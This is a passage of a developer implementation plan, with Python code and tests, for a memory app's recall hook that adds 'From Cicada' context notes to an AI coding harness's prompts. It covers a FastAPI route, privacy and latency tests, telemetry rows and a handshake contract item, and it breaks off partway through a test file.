    (R-H7). Process-local, bounded to ``sessions`` (least recently used out)
    and thread-safe: the route reads it on the loop and ``respond`` resets it
    in a worker thread."""

    def __init__(self, turns: int = RECENT_TURNS, sessions: int = MAX_SESSIONS):
        self._turns = turns
        self._sessions = sessions
        self._lock = threading.Lock()
        self._data: OrderedDict[str, deque] = OrderedDict()

    def recent(self, session_id: str) -> frozenset[str]:
        with self._lock:
            window = self._data.get(session_id)
            return frozenset().union(*window) if window else frozenset()

    def remember(self, session_id: str, ids) -> None:
        with self._lock:
            window = self._data.pop(session_id, None) or deque(maxlen=self._turns)
            window.append(frozenset(ids))
            self._data[session_id] = window
            while len(self._data) > self._sessions:
                self._data.popitem(last=False)

    def reset(self, session_id: str) -> None:
        with self._lock:
            self._data.pop(session_id, None)

    def clear(self) -> None:
        with self._lock:
            self._data.clear()


RECENT = RecentPages()


def reset() -> None:
    """Forget every session window and cached model id (tests)."""
    RECENT.clear()
    with _MODELS_LOCK:
        _MODELS.clear()
```

- [ ] **Step 7: Green.** `api/.venv/bin/python -m pytest api/tests/test_hook_recall.py
  api/tests/test_search_index.py api/tests/test_search_service.py -q -p no:cacheprovider`, then every test file
  that exercises `check_nudges`: `rg -l check_nudges api/tests -g 'test_*.py'` (the glob keeps
  `fixtures/mcp_stdio_golden.json` out of pytest's argument list; nine files on this base, 158 tests). If a CASES row fails, fix the floor in
  `mention_strength`/`STOPWORDS`, never the table. The table is the ruling. Then the full suite.
- [ ] **Step 8: Commit** (stage the six files by name) —
  `feat(recall): the recall engine — a named-mention floor and a ≤400-token note (G149)`.

---

### Task 2: `POST /capture/hook-context`, the contract item, the ledger row, and the measurements

**Files:**
- Modify: `api/routers/capture.py` (docstring, imports, model + route after the transcript route),
  `api/services/hook_recall.py` (append `respond`, `record`, buckets), `api/services/telemetry.py` (`:22-26`,
  `:43`, `:152`), `api/services/consumption_stats.py` (`_activity`, `:250-258`), `api/services/handshake.py` (`:9`,
  `:46-56`, `:155-162`, `_CONTRACT` `:205-230`)
- Modify tests: `api/tests/test_demo_capture_routes.py` (`HANDLED_ELSEWHERE`, `:44`), `api/tests/test_handshake.py`
  (`:55-56` + one test), `api/tests/test_handshake_r12.py` (one test), `api/tests/test_consumption_stats.py` (one
  test)
- Create tests: `api/tests/test_hook_context_route.py`, `api/tests/test_hook_recall_privacy.py`,
  `api/tests/test_hook_recall_latency.py`

**Interfaces:**
- Produces:
  - Route `POST /capture/hook-context`. Body `{event: session_start|user_prompt_submit, harness: claude-code|codex,
    session_id, cwd?, prompt?, model?}` (snake_case). Response `{additionalContext: str|null, injected: [ids],
    reason, latencyMs}`.
  - `hook_recall.respond(root, *, event, harness, session_id, prompt, deadline) -> (Injection, bank_name|None)`.
  - `hook_recall.record(...)`, `telemetry.HOOK_RECALL_KIND`, `handshake.CONTRACT_VERSION == 7`.
- Consumes: Task 1, `bank_registry.capture_bank`, `telemetry.record`.

- [ ] **Step 1: Failing tests.**

`api/tests/test_hook_context_route.py`:

```python
"""G149 R-H1/R-H6/R-H7/R-H9/R-H16 — POST /capture/hook-context over a
synthetic bank: the shape, the session window, the budget, the demo rule and
the ledger row. No real bank, no network."""
from __future__ import annotations

import time

import pytest
from fastapi.routing import APIRoute
from fastapi.testclient import TestClient

from api import config, main
from api.services import bank_registry, hook_recall, recall_text, telemetry
from test_hook_recall import _index, _page, bank  # noqa: F401 — the same synthetic bank

URL = "/capture/hook-context"


def _body(prompt: str | None = "How is the Alpha Project going?", *, event="user_prompt_submit", session="s-1",
          harness="claude-code", model=None):
    return {"event": event, "harness": harness, "session_id": session, "cwd": "/home/example/alpha-project",
            "prompt": prompt, "model": model}


@pytest.fixture(autouse=True)
def _clean():
    hook_recall.reset()
    yield
    hook_recall.reset()
    config.get_settings.cache_clear()


@pytest.fixture
def client(bank, monkeypatch):  # noqa: F811
    monkeypatch.setenv("CICADA_MEMORY_PATH", str(bank))
    config.get_settings.cache_clear()
    return TestClient(main.app)


def test_a_named_page_comes_back_as_the_note(client):
    r = client.post(URL, json=_body())
    assert r.status_code == 200, r.text
    data = r.json()
    assert set(data) == {"additionalContext", "injected", "reason", "latencyMs"}
    assert data["injected"] == ["alpha-project"] and data["reason"] == "injected"
    assert data["additionalContext"].startswith(recall_text.RECALL_HEADER)
    assert isinstance(data["latencyMs"], int) and data["latencyMs"] >= 0


def test_a_miss_is_null_and_says_why(client):
    data = client.post(URL, json=_body("fix the failing test in the parser")).json()
    assert (data["additionalContext"], data["injected"], data["reason"]) == (None, [], "no_match")


def test_the_window_holds_across_requests_and_session_start_resets_it(client):
    assert client.post(URL, json=_body()).json()["reason"] == "injected"
    assert client.post(URL, json=_body("alpha project budget?")).json()["reason"] == "recently_shown"
    assert client.post(URL, json=_body("alpha project?", session="s-2")).json()["reason"] == "injected"
    start = client.post(URL, json=_body(None, event="session_start")).json()
    assert start["reason"] == "primer" and start["injected"] == []
    assert start["additionalContext"].startswith(recall_text.PRIMER_HEADER)
    assert client.post(URL, json=_body("alpha project")).json()["reason"] == "injected"


def test_past_the_budget_nothing_is_injected_and_the_window_is_untouched(client, monkeypatch):
    real = hook_recall.prompt_context

    def slow(*a, **k):
        time.sleep(0.2)
        return real(*a, **k)

    monkeypatch.setattr(hook_recall, "PROMPT_BUDGET_S", 0.05)
    monkeypatch.setattr(hook_recall, "prompt_context", slow)
    data = client.post(URL, json=_body()).json()
    assert (data["additionalContext"], data["reason"]) == (None, "timeout")
    time.sleep(0.25)  # the worker finishes; its answer must not have aged the window
    monkeypatch.setattr(hook_recall, "prompt_context", real)
    monkeypatch.setattr(hook_recall, "PROMPT_BUDGET_S", 0.3)
    assert client.post(URL, json=_body()).json()["reason"] == "injected"


def test_a_failure_is_an_empty_answer_never_a_500(client, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("anything")

    monkeypatch.setattr(hook_recall, "prompt_context", boom)
    r = client.post(URL, json=_body())
    assert r.status_code == 200 and r.json()["reason"] == "error" and r.json()["additionalContext"] is None


def test_the_body_is_validated(client):
    assert client.post(URL, json=_body(harness="cursor")).status_code == 422
    assert client.post(URL, json=_body(event="stop")).status_code == 422
    assert client.post(URL, json=_body("x" * (hook_recall.PROMPT_MAX_CHARS + 1))).status_code == 422
    assert client.post(URL, json={**_body(), "session_id": ""}).status_code == 422


def test_the_prompt_can_only_travel_in_the_body():
    (route,) = [r for r in main.app.routes if isinstance(r, APIRoute) and r.path == URL]
    assert route.methods == {"POST"} and route.dependant.query_params == []


def test_the_route_needs_the_bearer_token(bank, monkeypatch, tmp_path):  # noqa: F811
    monkeypatch.setenv("CICADA_API_AUTH", "on")
    monkeypatch.setenv("CICADA_HOME", str(tmp_path / "home"))
    monkeypatch.setenv("CICADA_MEMORY_PATH", str(bank))
    monkeypatch.delenv("CICADA_API_TOKEN", raising=False)
    config.get_settings.cache_clear()
    assert TestClient(main.app).post(URL, json=_body()).status_code == 401


def test_the_demo_is_never_read_and_its_real_twin_is(tmp_path, monkeypatch):
    from test_demo_capture import _client, _demo, _open_demo_without_stamps, _root

    root = _root(tmp_path)
    bank_registry.create_bank(root, "work")
    work = bank_registry.bank_dir(root, "work")
    demo = _demo(root)
    for memory, summary in ((work, "The real one."), (demo, "Made-up demo text.")):
        (memory / "entities").mkdir(parents=True, exist_ok=True)
        _page(memory, "alpha-project", "Alpha Project", "project", summary=summary)
        _index(memory)
    bank_registry.activate_bank(root, "work")
    bank_registry.activate_bank(root, "demo")
    data = _client(root, monkeypatch).post(URL, json=_body()).json()
    assert "The real one." in data["additionalContext"] and "Made-up" not in data["additionalContext"]

    other = tmp_path / "other"
    other.mkdir()
    root2 = _root(other)
    bank_registry.create_bank(root2, "work")
    _demo(root2)
    _open_demo_without_stamps(root2)
    data = _client(root2, monkeypatch).post(URL, json=_body()).json()
    assert (data["additionalContext"], data["reason"]) == (None, "no_bank")


def test_one_ledger_row_per_firing_ids_and_enums_only_filed_beside_reads(client, monkeypatch):
    monkeypatch.setenv("CICADA_TELEMETRY", "on")
    client.post(URL, json=_body(model="claude-example-1"))
    client.post(URL, json=_body(None, event="session_start", model="not a model id!"))
    rows = [e for e in telemetry.read_events() if e.kind == telemetry.HOOK_RECALL_KIND]
    assert len(rows) == 2
    first = rows[0]
    assert set(first.refs) == {"harness", "event", "reason", "injected", "entity_ids", "inbox", "tokens",
                               "latency", "model"}
    assert first.refs["entity_ids"] == ["alpha-project"] and first.refs["model"] == "claude-example-1"
    assert rows[1].refs["model"] is None, "only an id-shaped model string is kept"
    assert first.stage == "hook_recall" and first.billing == "free" and first.connection is None
    assert telemetry.HOOK_RECALL_KIND in telemetry.NON_SPEND_KINDS
    month = first.ts[:7]
    assert telemetry.HOOK_RECALL_KIND in telemetry.ledger_file(month, kind="read").read_text()
    events = telemetry.ledger_file(month)
    assert not events.exists() or telemetry.HOOK_RECALL_KIND not in events.read_text(), \
        "R-H9: a hook row must never tick the app's consumption domain (G124 M2)"
```

`api/tests/test_hook_recall_privacy.py`:

```python
"""G149 R-H10 — after a hit, a miss, a primer, an internal failure whose
message carries the prompt and a 422, the prompt appears in NO log (loguru at
DEBUG with diagnose on, the stdlib loggers), no file under CICADA_HOME (ledger,
handshake cache) and no byte under the bank (derived indexes included).
Task 3 appends the hook script's end-to-end round trip (recall.log included),
because `api/hooks/recall.py` does not exist until then."""
from __future__ import annotations

import io
import logging
import os
import sqlite3
from pathlib import Path

from fastapi.testclient import TestClient
from loguru import logger

from api import config, main
from api.services import hook_recall, search_index
from test_hook_recall import bank  # noqa: F401

SENTINEL = "zqxsentinel"
PROMPT = f"How is the Alpha Project going? {SENTINEL} {SENTINEL}7f3a"


def _files(root: Path) -> list[Path]:
    return [p for p in root.rglob("*") if p.is_file()]


def test_the_prompt_never_reaches_a_log_the_ledger_or_the_bank(bank, monkeypatch, caplog):  # noqa: F811
    monkeypatch.setenv("CICADA_TELEMETRY", "on")
    monkeypatch.setenv("CICADA_MEMORY_PATH", str(bank))
    config.get_settings.cache_clear()
    home = Path(os.environ["CICADA_HOME"])
    sink = io.StringIO()
    handler = logger.add(sink, level="DEBUG", backtrace=True, diagnose=True)
    caplog.set_level(logging.DEBUG)
    try:
        client = TestClient(main.app)
        body = {"event": "user_prompt_submit", "harness": "claude-code", "session_id": "s-priv",
                "cwd": None, "prompt": PROMPT, "model": None}
        assert client.post("/capture/hook-context", json=body).json()["reason"] == "injected"
        assert client.post("/capture/hook-context",
                           json={**body, "prompt": f"{SENTINEL} nothing named"}).json()["reason"] == "no_match"
        client.post("/capture/hook-context", json={**body, "event": "session_start", "prompt": None})

        def fail(self, terms, limit):
            raise sqlite3.OperationalError(f'fts5: syntax error near "{SENTINEL}"')

        monkeypatch.setattr(search_index.Reader, "name_candidates", fail)
        hook_recall.reset()
        assert client.post("/capture/hook-context", json=body).json()["reason"] == "error"
        assert client.post("/capture/hook-context",
                           json={**body, "prompt": "x" * hook_recall.PROMPT_MAX_CHARS + SENTINEL}).status_code == 422
    finally:
        logger.remove(handler)
        config.get_settings.cache_clear()
    assert SENTINEL not in sink.getvalue(), "loguru (diagnose on) saw the prompt"
    assert SENTINEL not in caplog.text, "a stdlib logger saw the prompt"
    written = _files(home)
    assert any(p.name.startswith("reads-") for p in written), "the ledger row was written, so this checked it"
    for path in written + _files(bank):
        assert SENTINEL.encode() not in path.read_bytes(), path
```

`api/tests/test_hook_recall_latency.py`:

```python
"""G149 — the recall hook's latency and note size at the live bank's scale:
the 2,000-entity / 1,500-episode synthetic bank ``test_search_latency`` builds
(fixed seed, made-up syllables), FTS warm. Run with ``-s`` for the numbers the
PR body reports. Budgets: the service p95 ≤ 100 ms and the route p95 ≤ 150 ms,
both inside R-H6's hard 300 ms; every note ≤ 400 tokens; zero notes for the
English prompts."""
from __future__ import annotations

import statistics
import time

from fastapi.testclient import TestClient

from api import config, main
from api.services import hook_recall, markdown_parser
from test_search_latency import big_bank  # noqa: F401 — module-scoped, built once here

ENGLISH = [
    "Fix the failing test in the parser", "Summarize this error log for me", "Write a function that parses dates",
    "What does this stack trace mean", "Rename the variables to be clearer", "Make the button bigger on mobile",
    "Explain how async iterators work", "Why is the build slow today", "Draft a polite reply to this email",
    "Convert this list into a table", "Add type hints to this module", "Review the diff before I merge",
]


def _named(memory, n=60):
    out = []
    for i in range(0, 2000, 2000 // n):
        if i % 5 == 4:          # media pages are not in the entity table
            continue
        page = markdown_parser.parse(memory / "entities" / f"e-{i}.md")
        out.append((f"e-{i}", f"Where does {page.frontmatter['name']} stand after last week?"))
    return out


def _p(samples):
    return statistics.median(samples), statistics.quantiles(samples, n=20)[18]


def test_the_service_is_fast_small_and_silent_on_english(big_bank):  # noqa: F811
    memory, _ = big_bank
    hook_recall.reset()
    named = _named(memory)
    for _, prompt in named[:5]:
        hook_recall.prompt_context(memory, prompt)            # warm SQLite's page cache
    samples, tokens = [], []
    for page_id, prompt in named:
        started = time.perf_counter()
        result = hook_recall.prompt_context(memory, prompt)
        samples.append(time.perf_counter() - started)
        assert page_id in result.injected, prompt
        tokens.append(result.tokens)
    for prompt in ENGLISH * 5:
        started = time.perf_counter()
        result = hook_recall.prompt_context(memory, prompt)
        samples.append(time.perf_counter() - started)
        assert result.injected == (), prompt
    p50, p95 = _p(samples)
    t = sorted(tokens)
    print(f"\nG149 service (FTS warm, {len(samples)} prompts): p50 {p50 * 1000:.1f} ms, p95 {p95 * 1000:.1f} ms")
    print(f"G149 note tokens over {len(t)} hits: min {t[0]}, p50 {t[len(t) // 2]}, "
          f"p95 {t[int(len(t) * 0.95) - 1]}, max {t[-1]}")
    assert p95 <= 0.100 and t[-1] <= hook_recall.MAX_TOKENS


def test_the_route_and_the_primer_are_inside_the_budget(big_bank, monkeypatch):  # noqa: F811
    memory, _ = big_bank
    hook_recall.reset()
    monkeypatch.setenv("CICADA_MEMORY_PATH", str(memory))
    config.get_settings.cache_clear()
    client = TestClient(main.app)
    samples = []
    for n, (_, prompt) in enumerate(_named(memory, 40) * 2):
        body = {"event": "user_prompt_submit", "harness": "claude-code", "session_id": f"s{n}", "prompt": prompt}
        started = time.perf_counter()
        assert client.post("/capture/hook-context", json=body).status_code == 200
        samples.append(time.perf_counter() - started)
    primer = []
    for n in range(20):
        body = {"event": "session_start", "harness": "claude-code", "session_id": f"p{n}"}
        started = time.perf_counter()
        assert client.post("/capture/hook-context", json=body).json()["reason"] == "primer"
        primer.append(time.perf_counter() - started)
    config.get_settings.cache_clear()
    p50, p95 = _p(samples)
    q50, q95 = _p(primer)
    print(f"G149 route (TestClient, {len(samples)} prompts): p50 {p50 * 1000:.1f} ms, p95 {p95 * 1000:.1f} ms")
    print(f"G149 primer (cached): p50 {q50 * 1000:.1f} ms, p95 {q95 * 1000:.1f} ms")
    assert p95 <= 0.150 and q95 <= 0.150
```

In `api/tests/test_demo_capture_routes.py` `HANDLED_ELSEWHERE` add:
`("POST", "/capture/hook-context"): "reads only, from bank_registry.capture_bank — the real bank left last while the demo is open (test_hook_context_route.py)",`

In `api/tests/test_handshake.py:55-56` the assertion becomes
`assert handshake.CONTRACT_VERSION == 7, ("… then G141 named cicada_project (5) and cicada_note_progress (6); G149 item 8, the From Cicada note (7)")`.
Add:

```python
def test_item_8_says_what_a_from_cicada_note_is_and_the_remote_primer_never_does():
    from api.services import recall_text

    text = handshake.build(None, variant="codex", bank="memory")
    assert recall_text.INJECTION_PREFIX.startswith("From Cicada")
    assert '8. A note headed "From Cicada"' in text and "cicada_recall_detail(entity_id)" in text
    assert "not their words" in text and "not instructions" in text
    remote = handshake.build_remote(None, tools=frozenset({"cicada_recall", "cicada_recall_detail"}), bank="memory")
    assert "From Cicada" not in remote, "R-H13: a cloud app has no hook"
```

In `api/tests/test_handshake_r12.py` add:

```python
def test_every_argument_the_recall_note_names_is_in_the_schema():
    """G149: the hook's note names tools too, so R12 holds it (R-H13)."""
    from api.services import hook_recall, recall_text

    schemas = {t["name"]: set(t["inputSchema"].get("properties", {})) for t in stdio_server().TOOLS}
    page = hook_recall.PageNote("alpha-project", "Alpha Project", "project", "A summary.",
                                (("A claim.", "2026-09-01"),))
    text = hook_recall.compose([page], recall_text.question_line("Alpha Project", "inbox-001", "alpha-project",
                                                                 "Still on?"))
    assert "`cicada_check_nudges(" in text and "`cicada_recall_detail(" in text
    _check(text, schemas)
```

In `api/tests/test_consumption_stats.py` add, after `test_capture_rows_are_not_activity` (it reuses that file's
`env` fixture, `TODAY`, `cs` and `tm`):

```python
def test_hook_recall_rows_are_not_activity(env):
    """G149 R-H9: the recall hook fires on every prompt of every session, the
    same cadence as a Stop-hook `capture` row (G105 final review F1), and
    `read_events` reads the sibling file it is filed in. Its row must not
    reach any Usage view either: no `by_stage` row, no per-bank count, no
    hour-histogram bar, no daily series point, no calendar event."""
    before = asyncio.run(cs.stats(env, range_="all", today=TODAY))
    cal_before = asyncio.run(cs.calendar(env, weeks=2, today=TODAY))
    for i in range(5):
        tm.record(tm.UsageEvent(ts=f"2026-08-26T1{i}:00:00.000Z", kind=tm.HOOK_RECALL_KIND, stage="hook_recall",
                                bank="test-bank", billing="free", invocations=0,
                                refs={"harness": "claude-code", "event": "user_prompt_submit", "reason": "no_match"}))
    assert len([e for e in tm.read_events() if e.kind == tm.HOOK_RECALL_KIND]) == 5, "the rows were written"
    after = asyncio.run(cs.stats(env, range_="all", today=TODAY))
    assert "hook_recall" not in {s["stage"] for s in after["by_stage"]}
    assert "test-bank" not in {b["bank"] for b in after["by_bank"]}
    assert after["hour_histogram"] == before["hour_histogram"] and after["series"] == before["series"]
    assert after["first_event"] == before["first_event"]
    assert asyncio.run(cs.calendar(env, weeks=2, today=TODAY)) == cal_before
```

Run the new and edited files → red (no route, no kind, version 6).

- [ ] **Step 2: `telemetry.py`.** Append `"hook_recall"` to `KINDS`. Below `KINDS` add:

```python
# G149: one row per recall-hook firing — harness, event, reason enum, the page
# ids shown and their count, token and latency buckets, the model id when the
# harness sent one (D7: an id is an enum). Never the prompt (R-H9, R-H10).
HOOK_RECALL_KIND = "hook_recall"
```

Add it to `NON_SPEND_KINDS` (`:43`) and to `SIBLING_KINDS` (`:152`, extending the comment: "G149 R-H9: a hook row
fires on every prompt, so it is filed here for the same reason"). Nothing else in `telemetry` changes.

- [ ] **Step 2b: `consumption_stats._activity` (R-H9).** Above `_activity` (`:250`) add, and use it in the filter:

```python
#: Per-turn receipts: one row per reply of every session (G105's `capture`) or
#: per prompt (G149's `hook_recall`). Counting them charts the person's chat
#: cadence, not Cicada's work (G105 final review F1), and `read_events` reads
#: the sibling file `hook_recall` is filed in, so filing it apart is not enough.
PER_TURN_KINDS = frozenset({"capture", telemetry.HOOK_RECALL_KIND})
```

`_activity`'s body becomes `return [e for e in events if e.kind not in PER_TURN_KINDS]`, and its docstring gains one
sentence: "G149's `hook_recall` row (one per prompt) is the same class." `by_connection` already excludes it
through `NON_SPEND_KINDS`.

- [ ] **Step 3: `hook_recall.py` appends `respond` and `record`.** Add
`from api.services import bank_registry, telemetry` to the imports.

```python
def respond(root: Path, *, event: str, harness: str, session_id: str, prompt: str,
            deadline: float) -> tuple[Injection, str | None]:
    """The route's one worker call: the bank a capture would write into
    (``bank_registry.capture_bank``, R-H16), then the primer or the note.
    SessionStart resets the session's window (R-H7): after compact or clear
    the earlier notes are gone from the model's context."""
    target = bank_registry.capture_bank(Path(root))
    if target is None:
        return Injection.none("no_bank"), None
    if event == "session_start":
        RECENT.reset(session_id)
        return session_primer(target.path, harness), target.name
    return prompt_context(target.path, prompt, recent=RECENT.recent(session_id), deadline=deadline), target.name


LATENCY_BUCKETS = ((50, "<50"), (100, "50-100"), (200, "100-200"), (300, "200-300"))
TOKEN_BUCKETS = ((0, "0"), (100, "1-100"), (200, "101-200"), (300, "201-300"), (400, "301-400"))


def _bucket(value: int, buckets, top: str) -> str:
    return next((label for limit, label in buckets if value <= limit), top)


def _model_id(model: str | None) -> str | None:
    """A model id as the harness sent it, only when it is id-shaped (D7)."""
    m = str(model or "").strip()
    return m if m and len(m) <= 80 and all(c.isalnum() or c in "._:/-[]" for c in m) else None


def record(event: str, harness: str, result: Injection, *, latency_ms: int, model: str | None,
           bank: str | None) -> None:
    """One ``hook_recall`` ledger row (R-H9): ids, enums and buckets only,
    filed beside ``read``. Never raises: the ledger never costs a prompt."""
    try:
        telemetry.record(telemetry.UsageEvent(
            kind=telemetry.HOOK_RECALL_KIND, stage="hook_recall", bank=bank, invocations=0, billing="free",
            refs={"harness": harness, "event": event, "reason": result.reason,
                  "injected": len(result.injected), "entity_ids": list(result.injected),
                  "inbox": result.inbox_id is not None,
                  "tokens": _bucket(result.tokens, TOKEN_BUCKETS, ">400"),
                  "latency": _bucket(latency_ms, LATENCY_BUCKETS, ">300"),
                  "model": _model_id(model)}))
    except Exception:  # noqa: BLE001
        pass
```

- [ ] **Step 4: The route.** In `api/routers/capture.py`:
  - The module docstring's "Two today" becomes three, adding "and the G149 recall hooks' read,
    `POST /capture/hook-context` (`api/services/hook_recall.py`)".
  - Add `import time`, `from pydantic import BaseModel, Field`, and `hook_recall` to the `api.services` import.
  - Append:

```python
class HookContextRequest(BaseModel):
    """What the recall hook forwards (G149): the harness's own stdin fields.
    Snake_case like ``TranscriptCaptureRequest``, because the sender is a stdlib
    script. The prompt rides in this JSON body and nowhere else, never a query
    string, so uvicorn's access line can never hold it (G136 R22, R-H1).
    ``cwd`` is accepted and unused (R-H17)."""

    event: Literal["session_start", "user_prompt_submit"]
    harness: Literal["claude-code", "codex"]
    session_id: str = Field(..., min_length=1, max_length=200)
    cwd: str | None = Field(None, max_length=4096)
    prompt: str | None = Field(None, max_length=hook_recall.PROMPT_MAX_CHARS)
    model: str | None = Field(None, max_length=200)


@router.post("/capture/hook-context")
async def hook_context_endpoint(req: HookContextRequest, settings: Settings = Depends(get_settings)):
    """G149: what a harness's SessionStart / UserPromptSubmit hook puts in front
    of the model. Engine-free and read-only; ``additionalContext: null`` when
    there is nothing worth saying, so a miss costs zero tokens.

    Bearer-authed like ``/capture/transcript``. Never gated by
    ``refuse_capture_into_demo``: it writes nothing, and it reads the bank a
    capture would write into (``bank_registry.capture_bank``), the real bank
    left most recently while the demo is open, nothing when there is none
    (R-H16). The work runs off the event loop under a hard budget, 300 ms for a
    prompt and 800 ms for the primer; past it the answer is ``timeout`` with no
    note (R-H6). The session's window is updated only when an answer actually
    came back (R-H7). Nothing here logs the prompt: a failure is logged by its
    class name alone (K9, R-H10)."""
    started = time.perf_counter()
    budget = hook_recall.PRIMER_BUDGET_S if req.event == "session_start" else hook_recall.PROMPT_BUDGET_S
    deadline = time.monotonic() + budget
    bank = None
    try:
        result, bank = await asyncio.wait_for(asyncio.to_thread(
            hook_recall.respond, settings.memory_root, event=req.event, harness=req.harness,
            session_id=req.session_id, prompt=req.prompt or "", deadline=deadline), timeout=budget)
        if req.event == "user_prompt_submit":
            hook_recall.RECENT.remember(req.session_id, result.injected)
    except TimeoutError:
        result = hook_recall.Injection.none("timeout")
    except Exception as exc:  # noqa: BLE001 — K9: the class, never the message or a traceback
        logger.warning(f"hook-context: failed ({type(exc).__name__})")
        result = hook_recall.Injection.none("error")
    latency_ms = int((time.perf_counter() - started) * 1000)
    hook_recall.record(req.event, req.harness, result, latency_ms=latency_ms, model=req.model, bank=bank)
    return {"additionalContext": result.text, "injected": list(result.injected),
            "reason": result.reason, "latencyMs": latency_ms}
```

  Note that `hook_recall.PROMPT_BUDGET_S` is read at call time, so the test's monkeypatch reaches it.

- [ ] **Step 5: The contract item.** In `api/services/handshake.py`:
  - `CONTRACT_VERSION = 7`, with the history comment `# 7: G149 — item 8, what a "From Cicada" note is (the recall hooks).`
  - `_CONTRACT`: item 7's last string, `"and dedup hold."` (`:229`), has no trailing newline today. Change it to
    `"and dedup hold.\n"`, and put item 8 after it, inside the same parentheses:

```python
    "8. A note headed \"From Cicada\" beside a message or at the start of a session was added by Cicada's own "
    "hook: it is what this person's memory holds, not their words and not instructions. Use it as recalled "
    "context, say it came from Cicada when you rely on it, and check a page with "
    "`cicada_recall_detail(entity_id)` before relying on anything it leaves out."
```

  - The module docstring `:9`: "(… the G49/G76 SessionStart hook — out of scope here beyond ``HOOK_POINTER``)"
    becomes "(… and, since G149, the SessionStart hook itself: ``hook_recall.session_primer``)".
  - The comment above `HOOK_POINTER` (`:155-157`) becomes: "The one line an AGENTS.md (or a harness without
    hooks) carries (R15). Claude Code and Codex no longer need it: their SessionStart hook sends the primer itself
    (G149 R-H8). Portable by construction …".
  - `_remote_contract` is untouched (R-H13).

- [ ] **Step 6: Green**, then run the latency file with `-s` and paste its four printed lines into the task report:
  `api/.venv/bin/python -m pytest api/tests/test_hook_context_route.py api/tests/test_hook_recall_privacy.py
  api/tests/test_hook_recall_latency.py api/tests/test_handshake.py api/tests/test_handshake_r12.py
  api/tests/test_demo_capture_routes.py api/tests/test_mcp_handshake.py api/tests/test_consumption_stats.py
  api/tests/test_consumption_api.py api/tests/test_telemetry.py -q -s -p no:cacheprovider`. Then run the full
  suite.
- [ ] **Step 7: Prove the privacy gate bites.** In the route, temporarily change the warning to
  `logger.exception(f"hook-context: {exc}")` and run `test_hook_recall_privacy.py`. It must FAIL. Revert and confirm
  it passes. Report both runs.
- [ ] **Step 8: Commit** (stage by name: `api/routers/capture.py`, `api/services/hook_recall.py`,
  `api/services/telemetry.py`, `api/services/consumption_stats.py`, `api/services/handshake.py` and the seven test
  files above) — `feat(recall): POST /capture/hook-context, contract item 8, the hook_recall ledger row (G149)`.

---

### Task 3: The hook script, its registration, and capture's guard

**Files:**
- Create: `api/hooks/recall.py`, `api/tests/test_recall_hook.py`, `api/tests/fixtures/agent_autorecall_argv.json`
- Modify: `api/hooks/registry.py`, `api/services/agent_wiring.py`, `api/models/schemas.py` (`:2274`, `:2290-2292`),
  `api/services/transcript_extract.py` (`:52-56`, `:297-300`, `:373`), `install.sh` (`:1-28`, `:51-55`, `:70`,
  `:122-127`, after `:322`, `:408`), `scripts/doctor.sh` (after `:190`)
- Modify tests: `api/tests/test_hooks_registry.py`, `api/tests/test_agent_wiring.py`,
  `api/tests/test_transcript_extract.py`, `api/tests/test_hook_recall_privacy.py` (the script round trip)

**Interfaces:**
- Produces:
  - `recall.main(argv, *, stdin, stdout, environ, post, log_path, token_path) -> 0`, `recall.TIMEOUT_S = 0.9`.
  - `registry.RECALL_MARKER`, `registry.MARKERS`, `registry.uninstall(path, *, hook=None)`, CLI
    `uninstall --hook {capture,recall}`.
  - `agent_wiring.{RECALL_EVENTS, recall_hook_command, autorecall_argv, autorecall_fields}`.
  - Wire: `AgentWiringRow.autorecall`, `autorecallOn`, `autorecallOff`; step values `autorecall` and
    `autorecall-off`.
- Consumes: the Task 2 route; `recall_text.is_injection`.

- [ ] **Step 1: Failing tests.**

`api/tests/test_recall_hook.py`:

```python
"""G149 R-H6/R-H10/R-H15 — the recall hook never blocks or erases a prompt,
prints only the one JSON object both harnesses parse, and never writes the
prompt anywhere. Everything is injected; no network, no real home dir."""
from __future__ import annotations

import io
import json
from pathlib import Path

from api.hooks import recall as hook

SID = "11111111-2222-4333-8444-555555555555"
PROMPT = "How is the Alpha Project going?"
UPS = {"session_id": SID, "hook_event_name": "UserPromptSubmit", "cwd": "/home/example/alpha-project",
       "transcript_path": f"/home/example/.claude/projects/x/{SID}.jsonl", "prompt": PROMPT}
START = {"session_id": SID, "hook_event_name": "SessionStart", "source": "startup", "model": "claude-example-1"}
NOTE = "From Cicada (the person's memory; added by Cicada's hook, not typed by them) — …"


def _run(tmp_path, payload, *, environ=None, post=None, argv=("--harness", "claude-code"), reply=None):
    token = tmp_path / "api_token"
    token.write_text("tok-123")
    log = tmp_path / "logs" / "recall.log"
    out = io.StringIO()
    calls = []

    def default_post(url, body, tok, timeout):
        calls.append((url, json.loads(body), tok, timeout))
        return 200, json.dumps(reply if reply is not None else
                               {"additionalContext": NOTE, "injected": ["alpha-project"], "reason": "injected",
                                "latencyMs": 12})

    stdin = io.StringIO(json.dumps(payload) if isinstance(payload, (dict, list)) else payload)
    rc = hook.main(list(argv), stdin=stdin, stdout=out, environ=environ or {}, post=post or default_post,
                   log_path=log, token_path=token)
    return rc, calls, out.getvalue(), log


def test_a_prompt_travels_as_a_json_body_and_the_note_prints_in_the_shared_shape(tmp_path):
    rc, calls, out, log = _run(tmp_path, UPS, environ={"CICADA_PORT": "8123"})
    assert rc == 0
    url, body, tok, timeout = calls[0]
    assert url == "http://127.0.0.1:8123/capture/hook-context"
    assert body == {"event": "user_prompt_submit", "harness": "claude-code", "session_id": SID,
                    "cwd": UPS["cwd"], "model": None, "prompt": PROMPT}
    assert tok == "tok-123" and timeout == hook.TIMEOUT_S and hook.TIMEOUT_S <= 0.9
    assert json.loads(out) == {"hookSpecificOutput": {"hookEventName": "UserPromptSubmit", "additionalContext": NOTE}}
    line = log.read_text()
    assert "user_prompt_submit" in line and "injected" in line and "pages=1" in line and "ms" in line
    assert "Alpha" not in line and "alpha-project" not in line and UPS["cwd"] not in line


def test_session_start_sends_no_prompt_and_forwards_the_model(tmp_path):
    _, calls, out, _ = _run(tmp_path, START)
    assert calls[0][1] == {"event": "session_start", "harness": "claude-code", "session_id": SID, "cwd": None,
                           "model": "claude-example-1", "prompt": None}
    assert json.loads(out)["hookSpecificOutput"]["hookEventName"] == "SessionStart"


def test_nothing_to_say_prints_nothing(tmp_path):
    rc, _, out, log = _run(tmp_path, UPS, reply={"additionalContext": None, "injected": [], "reason": "no_match",
                                                 "latencyMs": 3})
    assert (rc, out) == (0, "") and "no_match" in log.read_text()


def test_capture_off_and_recall_off_exit_before_any_request(tmp_path):
